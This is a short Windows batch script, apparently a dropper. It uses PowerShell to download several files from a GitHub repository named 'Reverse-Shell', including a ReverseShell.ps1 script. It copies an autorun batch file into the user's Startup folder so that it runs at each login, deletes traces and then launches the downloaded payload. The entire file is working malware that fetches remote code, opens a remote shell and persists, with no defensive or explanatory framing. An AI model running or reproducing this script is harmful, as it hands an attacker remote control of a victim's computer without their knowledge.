@echo off
c:
cd C:\
cd kaas
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/launch.bat -Outfile launch.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/file.bat -Outfile file.bat"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/ReverseShell.ps1 -Outfile ReverseShell.ps1"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/OscarZoomer/Reverse-Shell/main/autorun.bat -Outfile autorun.bat"
cd %appdata%
cd Microsoft
cd Windows
cd "Start Menu"
cd Programs
cd Startup
xcopy /s/y c:\kaas\autorun.bat
cd C:\
cd kaas
del /f run2.bat
del /f autorun.bat
launch.bat